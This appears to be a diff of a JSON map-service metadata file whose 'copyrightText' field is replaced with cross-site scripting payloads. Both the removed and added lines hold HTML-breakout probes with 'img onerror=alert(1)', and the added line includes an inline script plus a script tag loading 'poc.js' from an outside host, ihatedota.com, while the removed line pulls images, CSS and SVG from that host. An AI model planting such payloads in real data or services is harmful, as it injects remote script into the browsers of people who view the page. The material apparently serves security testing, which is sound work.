@@ -36,5 +36,5 @@
     "spatialReference": {"wkid": 102100, "latestWkid": 3857}
   },
   "spatialReference": {"wkid": 102100, "latestWkid": 3857},
-  "copyrightText":"dAAAA<noscript><p title=\"</noscript><img src=x onerror=alert(1)>\">BBB<noembed><img src=x onerror=alert(1)></noembed>CCC<img src=\"https://ihatedota.com/x?c=imgsrc\"nope=\"&quot;x&quot;\"onabc=abc>DDD<a href=\"https://ihatedota.com/x\" style=\"background:url('https://ihatedota.com/x?c=cssbg')\">e</a>EEE<svg><use href=\"https://ihatedota.com/evil.svg#x\"/></svg>FFF<a href=\"https://ihatedota.com/x\" rel=\"noreferrer\" style=\"color:red\">GGGGG"
+  "copyrightText":"dAAA<xmp><img src=x onerror=alert(1)></xmp>BBB<script src=\"https://ihatedota.com/poc.js\"></script>CCC<plaintext><img src=x onerror=alert(1)>DDD<script>alert(1)</script>EEE<textarea><img src=x onerror=alert(1)></textarea>FFFGG"
 }
